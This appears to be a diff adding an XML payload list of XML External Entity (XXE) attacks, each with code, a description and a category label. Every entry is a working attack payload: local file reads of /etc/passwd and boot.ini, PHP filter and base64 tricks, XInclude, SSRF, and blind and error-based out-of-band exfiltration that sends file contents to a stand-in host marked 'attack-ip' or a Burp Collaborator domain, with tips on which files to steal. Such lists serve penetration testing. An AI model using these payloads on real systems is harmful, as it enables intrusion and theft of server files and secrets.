@@ -1,0 +1,277 @@
+<?xml version="1.0"?>
+<xxe>
+	<attack>
+		<name>XXE Locator</name>
+		<code>&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY example &quot;Mantroll&quot;&gt; ]&gt;
+ &lt;userInfo&gt;
+  &lt;firstName&gt;Marantral&lt;/firstName&gt;
+  &lt;lastName&gt;&amp;example;&lt;/lastName&gt;
+ &lt;/userInfo&gt;</code>
+
+		<desc>This is a basic entity test. If the field is vulnerable the XML parser parses the external entities the result should have Marantral in the firstname and Mantroll in the last name. Etities are defined inside the DOCTYPE element. Also set the content-type to application/xml</desc>
+		<label>Basic XXE Attacks</label>
+
+	</attack>
+	<attack>
+		<name>XXE Linux File Classic 1</name>
+		<code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &apos;file:///etc/passwd&apos;&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;</code>
+
+		<desc>Entities are defined inside the DOCTYPE element. Also set the content-type to application/xml. /etc/passwd is a common file on Linux. You will want to modify that to what you are trying to get. There are always good things on .bash_history and other common locations</desc>
+		<label>Basic XXE File Retrieve Attacks</label>
+
+	</attack>
+	
+	<attack>
+		<name>XXE Linux File Classic 2</name>
+		<code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;data&gt;&amp;file;&lt;/data&gt;</code>
+
+		<desc>Entities are defined inside the DOCTYPE element. Also set the content-type to application/xml. /etc/passwd is a common file on Linux. You will want to modify that to what you are trying to get. There are always good things on .bash_history and other common locations</desc>
+		<label>Basic XXE File Retrieve Attacks</label>
+
+	</attack>
+	<attack>
+		<name>XXE Linux File Classic 3</name>
+		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+  &lt;!DOCTYPE foo [  
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code>
+
+		<desc>Entities are defined inside the DOCTYPE element. Also set the content-type to application/xml. /etc/passwd is a common file on Linux. You will want to modify that to what you are trying to get. There are always good things on .bash_history and other common locations</desc>
+		<label>Basic XXE File Retrieve Attacks</label>
+
+	</attack>
+	<attack>
+		<name>XXE Windows File Classic</name>
+		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [  
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/boot.ini&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code>
+
+		<desc>Entities are defined inside the DOCTYPE element. Also set the content-type to application/xml. boot.ini is a common file on Windows. You will want to modify that to what you are trying to get.</desc>
+		<label>Basic XXE File Retrieve Attacks</label>
+
+	</attack>
+	<attack>
+		<name>XXE Linux Base64 Encoded Classic</name>
+		<code>&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo/&gt;</code>
+
+		<desc>The Base64 encoded is trying to retreive the /etc/passwd file. You can encode other desired files and replace the encoded string.</desc>
+		<label>Basic XXE File Retrieve Attacks</label>
+
+	</attack>
+	<attack>
+		<name>XXE Windows Base64 Encoded Classic</name>
+		<code>"&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9jOi9ib290LmluaQo=&quot;&gt; %init; ]&gt;&lt;foo/&gt;</code>
+
+		<desc>The Base64 encoded is trying to retreive the c:\boot.ini file. You can encode other desired files and replace the encoded string.</desc>
+		<label>Basic XXE File Retrieve Attacks</label>
+
+	</attack>
+	<attack>
+		<name>PHP Wrapper inside XXE 1</name>
+		<code>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt; ]&gt;
+&lt;contacts&gt;
+  &lt;contact&gt;
+    &lt;name&gt;Jean &amp;xxe; Dupont&lt;/name&gt;
+    &lt;phone&gt;00 11 22 33 44&lt;/phone&gt;
+    &lt;adress&gt;42 rue du CTF&lt;/adress&gt;
+    &lt;zipcode&gt;75000&lt;/zipcode&gt;
+    &lt;city&gt;Paris&lt;/city&gt;
+  &lt;/contact&gt;
+&lt;/contacts&gt;</code>
+
+		<desc>No Discription</desc>
+		<label>PHP XXE</label>
+
+	</attack>
+	<attack>
+		<name>PHP Wrapper inside XXE 2</name>
+		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY % xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://attack-ip&quot; &gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code>
+
+		<desc>No Discription</desc>
+		<label>PHP XXE</label>
+
+	</attack>
+	<attack>
+		<name>XInclude attack</name>
+		<code>&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;
+&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</code>
+
+		<desc>When you can't modify the DOCTYPE element use the XInclude to target</desc>
+		<label>XInclude XXE</label>
+
+	</attack>
+	<attack>
+		<name>XXE + SSRF attack</name>
+		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1/secret_pass.txt&quot; &gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code>
+
+		<desc>XXE can be combined with the SSRF vulnerability to target another service. Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.</desc>
+		<label>SSRF XXE</label>
+
+	</attack>
+	<attack>
+		<name>Error Based XXE</name>
+		<code>---Payload to trigger the XXE---
+
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE message [
+    &lt;!ENTITY % ext SYSTEM &quot;http://attacker-ip/ext.dtd&quot;&gt;
+    %ext;
+]&gt;
+&lt;message&gt;&lt;/message&gt;
+
+--Contents of ext.dtd--
+
+&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &apos;file:///nonexistent/%file;&apos;&gt;&quot;&gt;
+%eval;
+%error;</code>
+
+		<desc>You will have to host the ext.dtd on a system that you control.</desc>
+		<label>Error XXE</label>
+
+	</attack>
+	<attack>
+		<name>Blind XXE</name>
+		<code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY % xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;
+&lt;!ENTITY callhome SYSTEM &quot;attack-ip/?%xxe;&quot;&gt;
+]
+&gt;
+&lt;foo&gt;&amp;callhome;&lt;/foo&gt;</code>
+
+		<desc>You will have to host a web server for the callhome to reach out to.</desc>
+		<label>Blind XXE</label>
+
+	</attack>
+	<attack>
+		<name>XXE OOB with DTD and PHP filter</name>
+		<code> ---Code to call the XXE--- 
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY % sp SYSTEM &quot;http://attack-ip/dtd.xml&quot;&gt;
+%sp;
+%param1;
+]&gt;
+&lt;r&gt;&amp;exfil;&lt;/r&gt;
+
+---dtd.xml File --
+&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &apos;http://attack-ip/dtd.xml?%data;&apos;&gt;&quot;&gt;</code>
+
+		<desc>You will have to host a web server hosting the dtd.xml file. you will also have to change the ip addresses maked with attack-ip</desc>
+		<label>XXE OOB</label>
+
+	</attack>
+	<attack>
+		<name>XXE with local DTD</name>
+		<code>&lt;!DOCTYPE root [
+    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/WHATEVERLOCAL.dtd&quot;&gt;
+
+    &lt;!ENTITY % ISOamsa '
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///REPLACE_WITH_FILENAME_TO_READ&quot;&gt;
+        &lt;!ENTITY &amp;#x25; eval &lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;>&quot;&gt;
+        &amp;#x25;eval;
+        &amp;#x25;error;
+        '&gt;
+
+    %local_dtd;
+]&gt;
+&lt;root&gt;&lt;/root&gt;</code>
+
+		<desc>You will have to find out what the local dtd file is called. This would be most likely done because of a verbose error message. If that does occure, you can then pick files to read and when you put them into the payload the content of the file should be placed in the error message.</desc>
+		<label>XXE OOB</label>
+
+	</attack>
+	<attack>
+		<name>XXE inside SVG</name>
+		<code>&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;
+&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;
+   &lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;</code>
+
+		<desc>This is using exotic file types to execute the XXE payload. In this case it is SVG</desc>
+		<label>XXE in exotic files</label>
+
+	</attack>
+	<attack>
+		<name>XXE inside SOAP</name>
+		<code>&lt;soap:Body&gt;
+  &lt;foo&gt;
+    &lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://attack-ip/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;
+  &lt;/foo&gt;
+&lt;/soap:Body&gt;</code>
+
+		<desc>This is using exotic file types to execute the XXE payload. In this case it is a SOAP Doc</desc>
+		<label>XXE in exotic files</label>
+
+	</attack>
+	<attack>
+		<name>XXE inside Excel File</name>
+		<code>See Below</code>
+
+		<desc>----Extract the excel file.----
+
+$ mkdir XXE &amp;&amp; cd XXE
+$ unzip ../XXE.xlsx
+Archive:  ../XXE.xlsx
+  inflating: xl/drawings/drawing1.xml
+  inflating: xl/worksheets/sheet1.xml
+  inflating: xl/worksheets/_rels/sheet1.xml.rels
+  inflating: xl/sharedStrings.xml
+  inflating: xl/styles.xml
+  inflating: xl/workbook.xml
+  inflating: xl/_rels/workbook.xml.rels
+  inflating: _rels/.rels
+  inflating: [Content_Types].xml
+
+ ------Add your blind XXE payload inside xl/workbook.xml. ----
+
+&lt;xml...&gt;
+&lt;!DOCTYPE x [ &lt;!ENTITY xxe SYSTEM &quot;http://YOURCOLLABORATORID.burpcollaborator.net/&quot;&gt; ]&gt;
+&lt;x&gt;&amp;xxe;&lt;/x&gt;
+&lt;workbook...&gt;
+
+ ------Rebuild the Excel file. -----
+
+$ zip -r ../poc.xslx *
+updating: [Content_Types].xml (deflated 71%)
+updating: _rels/ (stored 0%)
+updating: _rels/.rels (deflated 60%)
+updating: docProps/ (stored 0%)
+updating: docProps/app.xml (deflated 51%)
+updating: docProps/core.xml (deflated 50%)
+updating: xl/ (stored 0%)
+updating: xl/workbook.xml (deflated 56%)
+updating: xl/worksheets/ (stored 0%)
+updating: xl/worksheets/sheet1.xml (deflated 53%)
+updating: xl/styles.xml (deflated 60%)
+updating: xl/theme/ (stored 0%)
+updating: xl/theme/theme1.xml (deflated 80%)
+updating: xl/_rels/ (stored 0%)
+updating: xl/_rels/workbook.xml.rels (deflated 66%)
+updating: xl/sharedStrings.xml (deflated 17%)</desc>
+		<label>XXE in exotic files</label>
+
+	</attack>
+</xxe>
